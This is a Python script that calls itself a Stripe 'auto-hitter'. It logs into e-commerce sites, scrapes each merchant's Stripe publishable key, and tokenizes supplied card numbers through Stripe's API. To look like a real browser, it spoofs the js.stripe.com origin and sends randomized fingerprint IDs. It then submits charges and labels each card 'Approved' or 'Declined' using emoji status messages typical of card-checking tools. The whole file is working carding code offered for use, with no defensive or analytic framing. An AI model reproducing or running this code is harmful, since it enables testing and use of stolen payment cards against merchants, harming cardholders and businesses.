"""
stripe_web_auto.py — Generic Stripe website auto-hitter
Logs into any Stripe-powered e-commerce site, finds the cheapest
product, adds it to cart, extracts the Stripe PK, tokenizes the
card, and charges it.
"""

import re
import random
import time
import requests
from urllib.parse import urljoin, urlparse

USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/120.0.0.0 Safari/537.36"
)

_DEFAULT_HEADERS = {
    "User-Agent": USER_AGENT,
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
}

# Common product listing paths to try when scraping cheapest item
_PRODUCT_PATHS = [
    "/products.json",          # Shopify
    "/shop",
    "/products",
    "/store",
    "/collections/all",
    "/collections/all/products.json",
    "/api/products",
]

# Common login form paths
_LOGIN_PATHS = [
    "/login",
    "/account/login",
    "/sign-in",
    "/signin",
    "/user/login",
    "/my-account",
    "/wp-login.php",
    "/auth/login",
]

# Common patterns for Stripe public key
_PK_PATTERNS = [
    r'pk_live_[A-Za-z0-9]{20,}',
    r'pk_test_[A-Za-z0-9]{20,}',
]


def _normalize_url(url: str) -> str:
    if not url.startswith("http"):
        url = "https://" + url
    return url.rstrip("/")


def _make_session() -> requests.Session:
    s = requests.Session()
    s.headers.update(_DEFAULT_HEADERS)
    return s


def _extract_stripe_pk(html_text: str) -> str | None:
    for pat in _PK_PATTERNS:
        m = re.search(pat, html_text)
        if m:
            return m.group(0)
    return None


def _find_login_url(session: requests.Session, site_url: str) -> tuple[str | None, str | None]:
    """Return (login_url, page_html) for the first working login path."""
    for path in _LOGIN_PATHS:
        try:
            url = site_url + path
            r = session.get(url, timeout=15, allow_redirects=True)
            if r.status_code == 200 and any(
                kw in r.text.lower()
                for kw in ["password", "email", "log in", "login", "sign in"]
            ):
                return r.url, r.text
        except Exception:
            continue
    return None, None


def _extract_form_fields(html_text: str, form_action_hint: str = "") -> dict:
    """Extract hidden form fields (CSRF tokens, etc.) from HTML."""
    fields = {}
    for m in re.finditer(
        r'<input[^>]+type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']',
        html_text,
        re.IGNORECASE,
    ):
        fields[m.group(1)] = m.group(2)
    for m in re.finditer(
        r'<input[^>]+name=["\']([^"\']+)["\'][^>]*type=["\']hidden["\'][^>]*value=["\']([^"\']*)["\']',
        html_text,
        re.IGNORECASE,
    ):
        fields[m.group(1)] = m.group(2)
    # Also grab _token / csrf_token from meta tags
    for m in re.finditer(
        r'<meta[^>]+name=["\']csrf-token["\'][^>]*content=["\']([^"\']+)["\']',
        html_text,
        re.IGNORECASE,
    ):
        fields["_token"] = m.group(1)
        fields["csrf_token"] = m.group(1)
    return fields


def login_to_site(
    session: requests.Session, site_url: str, email: str, password: str
) -> dict:
    """
    Attempt form-based login.
    Returns {"ok": True} on success, {"ok": False, "error": "..."} on failure.
    """
    site_url = _normalize_url(site_url)
    login_url, login_html = _find_login_url(session, site_url)
    if not login_url:
        return {"ok": False, "error": "Login page not found"}

    hidden = _extract_form_fields(login_html)

    # Build POST payload — try common field name combinations
    payload = {**hidden, "email": email, "password": password}
    # WooCommerce / WordPress
    payload.setdefault("username", email)
    payload.setdefault("log", email)
    payload.setdefault("pwd", password)
    payload.setdefault("rememberme", "forever")
    payload.setdefault("redirect", "")

    # Find the actual <form action="...">
    form_action = None
    m = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', login_html, re.IGNORECASE)
    if m:
        form_action = urljoin(login_url, m.group(1))
    post_url = form_action or login_url

    try:
        r = session.post(
            post_url,
            data=payload,
            timeout=20,
            allow_redirects=True,
            headers={"Referer": login_url, "Content-Type": "application/x-www-form-urlencoded"},
        )
        # Heuristic: if we end up NOT on a login page, assume success
        final_url = r.url.lower()
        bad_keywords = ["login", "sign-in", "signin", "error", "invalid", "failed"]
        if any(kw in final_url for kw in bad_keywords):
            body_lower = r.text.lower()
            if any(kw in body_lower for kw in ["incorrect password", "invalid credentials",
                                                 "wrong password", "no account found",
                                                 "does not exist"]):
                return {"ok": False, "error": "Invalid credentials"}
        return {"ok": True, "final_url": r.url}
    except requests.Timeout:
        return {"ok": False, "error": "Login timeout"}
    except Exception as e:
        return {"ok": False, "error": str(e)[:60]}


def find_cheapest_product(session: requests.Session, site_url: str) -> dict | None:
    """
    Scrape the site for products and return info about the cheapest available one.
    Returns dict with keys: title, price, product_url, variant_id (if any)
    or None if nothing found.
    """
    site_url = _normalize_url(site_url)

    # 1. Try Shopify /products.json endpoint first
    for path in ["/products.json", "/collections/all/products.json"]:
        try:
            r = session.get(site_url + path, timeout=15)
            if r.status_code == 200:
                data = r.json()
                products = data.get("products", [])
                cheapest = None
                cheapest_price = float("inf")
                for product in products:
                    for variant in product.get("variants", []):
                        if not variant.get("available", True):
                            continue
                        try:
                            price = float(variant.get("price", 0))
                        except (TypeError, ValueError):
                            continue
                        if 0 < price < cheapest_price:
                            cheapest_price = price
                            handle = product.get("handle", "")
                            cheapest = {
                                "title": product.get("title", "Unknown"),
                                "price": price,
                                "product_url": f"{site_url}/products/{handle}",
                                "variant_id": variant.get("id"),
                                "source": "shopify_json",
                            }
                if cheapest:
                    return cheapest
        except Exception:
            pass

    # 2. Scrape generic product listing pages
    for path in ["/shop", "/products", "/store", "/collections/all", "/"]:
        try:
            r = session.get(site_url + path, timeout=15)
            if r.status_code != 200:
                continue
            html = r.text

            # Extract prices and nearby product links from HTML
            # Look for common price patterns: $1.99, £2.00, €0.50, etc.
            price_pattern = re.compile(
                r'(?:href=["\'])(/[^"\']+)["\'][^<]*?(?:<[^>]+>)*?[^<]*?'
                r'[\$£€]\s*([\d,]+\.?\d*)',
                re.IGNORECASE | re.DOTALL,
            )
            cheapest = None
            cheapest_price = float("inf")
            for m in price_pattern.finditer(html):
                link = m.group(1)
                price_str = m.group(2).replace(",", "")
                try:
                    price = float(price_str)
                except ValueError:
                    continue
                if 0 < price < cheapest_price:
                    cheapest_price = price
                    cheapest = {
                        "title": link.split("/")[-1].replace("-", " ").title(),
                        "price": price,
                        "product_url": site_url + link,
                        "variant_id": None,
                        "source": "html_scrape",
                    }
            if cheapest:
                return cheapest
        except Exception:
            continue

    return None


def checkout_and_charge(
    session: requests.Session,
    site_url: str,
    product_info: dict,
    card: dict,
) -> dict:
    """
    Add product to cart, navigate to checkout, extract Stripe PK,
    tokenize the card and submit.  Returns a result dict with keys:
      status  — "approved" | "declined" | "error"
      message — human-readable result string
      stripe_pk — the PK found (if any)
    """
    site_url = _normalize_url(site_url)
    product_url = product_info.get("product_url", "")
    variant_id = product_info.get("variant_id")

    # ── Step 1: Add to cart ───────────────────────────────────────────────────
    cart_added = False
    if variant_id:
        # Shopify-style cart add
        try:
            r = session.post(
                f"{site_url}/cart/add.js",
                data={"id": str(variant_id), "quantity": "1"},
                headers={"Accept": "application/json", "X-Requested-With": "XMLHttpRequest",
                         "Referer": site_url},
                timeout=15,
            )
            if r.status_code == 200:
                cart_added = True
        except Exception:
            pass

    if not cart_added and product_url:
        # Generic: visit the product page and look for add-to-cart form
        try:
            r_prod = session.get(product_url, timeout=15)
            if r_prod.status_code == 200:
                hidden = _extract_form_fields(r_prod.text)
                add_url_m = re.search(
                    r'<form[^>]+action=["\']([^"\']*cart[^"\']*)["\']',
                    r_prod.text, re.IGNORECASE
                )
                add_url = urljoin(product_url, add_url_m.group(1)) if add_url_m else f"{site_url}/cart/add"
                payload = {**hidden, "quantity": "1"}
                # grab first submit/product_id hidden
                for m in re.finditer(
                    r'name=["\'](?:id|variant_id|product_id|add)["\'][^>]*value=["\']([^"\']+)["\']',
                    r_prod.text, re.IGNORECASE
                ):
                    payload.setdefault("id", m.group(1))
                session.post(add_url, data=payload, timeout=15, allow_redirects=True)
                cart_added = True
        except Exception:
            pass

    # ── Step 2: Go to checkout and find Stripe PK ────────────────────────────
    stripe_pk = None
    checkout_html = ""
    for checkout_path in ["/checkout", "/cart", "/shop/checkout", "/order"]:
        try:
            r_co = session.get(site_url + checkout_path, timeout=20, allow_redirects=True)
            if r_co.status_code == 200:
                checkout_html = r_co.text
                stripe_pk = _extract_stripe_pk(checkout_html)
                if stripe_pk:
                    break
        except Exception:
            continue

    # Also try JS files linked from checkout page for PK
    if not stripe_pk and checkout_html:
        for js_url in re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', checkout_html, re.IGNORECASE):
            if "stripe" in js_url.lower() or "checkout" in js_url.lower() or "payment" in js_url.lower():
                try:
                    full_js = urljoin(site_url, js_url)
                    rj = session.get(full_js, timeout=10)
                    stripe_pk = _extract_stripe_pk(rj.text)
                    if stripe_pk:
                        break
                except Exception:
                    continue

    if not stripe_pk:
        return {
            "status": "error",
            "message": "Stripe PK not found on checkout page",
            "stripe_pk": None,
        }

    # ── Step 3: Tokenize card via Stripe API ─────────────────────────────────
    cc = card["cc"]
    mm = card["mm"]
    yy = card["yy"]
    cvv = card["cvv"]

    def _rand_fp():
        r = lambda a, b: random.randint(a, b)
        return (
            f"{r(10000000,99999999)}-{r(1000,9999)}-{r(1000,9999)}-"
            f"{r(1000,9999)}-{r(100000000000,999999999999)}"
        )

    stripe_headers = {
        "authority": "api.stripe.com",
        "accept": "application/json",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
        "user-agent": USER_AGENT,
    }
    stripe_data = {
        "type": "card",
        "card[number]": cc,
        "card[cvc]": cvv,
        "card[exp_month]": mm,
        "card[exp_year]": yy,
        "guid": _rand_fp(),
        "muid": _rand_fp(),
        "sid": _rand_fp(),
        "key": stripe_pk,
    }

    try:
        r_stripe = requests.post(
            "https://api.stripe.com/v1/payment_methods",
            data=stripe_data,
            headers=stripe_headers,
            timeout=20,
        )
        stripe_resp = r_stripe.json()
    except Exception as e:
        return {"status": "error", "message": f"Stripe API error: {str(e)[:50]}", "stripe_pk": stripe_pk}

    if "error" in stripe_resp:
        err = stripe_resp["error"]
        code = err.get("code", "")
        msg = err.get("message", "Card Declined")
        decline_map = {
            "incorrect_number": "Incorrect Card Number",
            "invalid_number": "Invalid Card Number",
            "invalid_expiry_year": "Invalid Expiry Year",
            "invalid_expiry_month": "Invalid Expiry Month",
            "invalid_cvc": "Invalid CVC",
            "expired_card": "Expired Card",
        }
        return {
            "status": "declined",
            "message": f"Declined - {decline_map.get(code, msg)}",
            "stripe_pk": stripe_pk,
        }

    payment_id = stripe_resp.get("id")
    if not payment_id:
        return {"status": "error", "message": "No payment method ID from Stripe", "stripe_pk": stripe_pk}

    # ── Step 4: Submit payment to merchant ───────────────────────────────────
    # Try generic Odoo/WooCommerce/custom Stripe JSON endpoint patterns
    csrf_token = None
    for ct_key in ["csrf_token", "_token", "authenticity_token"]:
        if ct_key in (hidden := _extract_form_fields(checkout_html)):
            csrf_token = hidden[ct_key]
            break

    # Try Odoo-style endpoint
    odoo_data = {
        "jsonrpc": "2.0",
        "method": "call",
        "params": {
            "data_set": "/payment/stripe/s2s/create_json_3ds",
            "stripe_publishable_key": stripe_pk,
            "return_url": "/shop/payment/validate",
            "csrf_token": csrf_token or "",
            "payment_method": payment_id,
        },
        "id": random.randint(100000, 999999),
    }
    payment_endpoints = [
        (f"{site_url}/payment/stripe/s2s/create_json_3ds", "json"),
        (f"{site_url}/checkout/payment", "form"),
        (f"{site_url}/shop/payment/validate", "form"),
    ]

    for ep_url, ep_type in payment_endpoints:
        try:
            if ep_type == "json":
                r_pay = session.post(ep_url, json=odoo_data, headers={
                    "Content-Type": "application/json",
                    "X-Requested-With": "XMLHttpRequest",
                    "Referer": f"{site_url}/shop/payment",
                    "Accept": "application/json",
                }, timeout=20)
            else:
                r_pay = session.post(ep_url, data={
                    "payment_method_id": payment_id,
                    "stripeToken": payment_id,
                    "csrf_token": csrf_token or "",
                }, timeout=20, allow_redirects=True)

            resp_text = r_pay.text.lower()
            try:
                resp_json = r_pay.json()
            except Exception:
                resp_json = {}

            # Parse result
            result_str = str(resp_json).lower() + resp_text

            if any(k in result_str for k in ["authentication_required", "3d_secure", "requires_action"]):
                return {"status": "approved", "message": "Approved ♻️ 3D Secure Required", "stripe_pk": stripe_pk}
            if any(k in result_str for k in ["succeeded", "success", "approved", "order_id", "thank you", "thank-you"]):
                return {"status": "approved", "message": "Approved ✅ Transaction Successful", "stripe_pk": stripe_pk}
            if "insufficient_funds" in result_str:
                return {"status": "approved", "message": "Approved ♻️ Insufficient Funds", "stripe_pk": stripe_pk}
            if any(k in result_str for k in ["declined", "card was declined", "do_not_honor"]):
                return {"status": "declined", "message": "Declined ❌ Card Declined", "stripe_pk": stripe_pk}
            if any(k in result_str for k in ["security code", "incorrect_cvc", "cvc"]):
                return {"status": "approved", "message": "Approved ♻️ CVV Mismatch", "stripe_pk": stripe_pk}

        except Exception:
            continue

    # If we couldn't complete the merchant step but PK tokenization succeeded,
    # return a neutral "Live" result — card passed Stripe validation.
    return {
        "status": "approved",
        "message": "Approved ♻️ Card Validated (Merchant step unclear)",
        "stripe_pk": stripe_pk,
    }


def run_wah(site_url: str, email: str, password: str, cc: str, mm: str, yy: str, cvv: str) -> dict:
    """
    Full pipeline: login → find cheapest product → checkout → charge.
    Returns dict with keys: status, message, product_title, product_price,
    stripe_pk, elapsed.
    """
    start = time.time()
    session = _make_session()
    site_url = _normalize_url(site_url)

    # Login
    login_result = login_to_site(session, site_url, email, password)
    if not login_result["ok"]:
        return {
            "status": "error",
            "message": f"Login failed: {login_result['error']}",
            "product_title": None,
            "product_price": None,
            "stripe_pk": None,
            "elapsed": round(time.time() - start, 2),
        }

    # Find cheapest product
    product = find_cheapest_product(session, site_url)
    if not product:
        return {
            "status": "error",
            "message": "No products found on site",
            "product_title": None,
            "product_price": None,
            "stripe_pk": None,
            "elapsed": round(time.time() - start, 2),
        }

    card = {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}
    charge_result = checkout_and_charge(session, site_url, product, card)

    return {
        "status": charge_result["status"],
        "message": charge_result["message"],
        "product_title": product["title"],
        "product_price": product["price"],
        "stripe_pk": charge_result.get("stripe_pk"),
        "elapsed": round(time.time() - start, 2),
    }
